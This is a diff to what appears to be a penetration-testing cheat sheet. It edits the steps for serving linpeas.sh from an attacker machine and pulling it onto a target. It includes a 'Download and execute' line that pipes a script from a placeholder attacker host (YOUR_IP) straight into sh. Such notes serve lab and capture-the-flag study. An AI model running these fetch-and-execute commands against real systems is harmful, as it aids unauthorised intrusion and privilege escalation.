@@ -42,10 +42,12 @@ fg
 ```
 python -m http.server 8000
 ```
-- Download examples on target
-```
-curl -L YOUR_IP:8000/linpeas.sh | sh
-```
+- Download to target
 ```
 wget YOUR_IP:8000/linpeas.sh -O linpeas.sh
 ```
+- Download and execute
+```
+curl -L YOUR_IP:8000/linpeas.sh | sh
+```
+
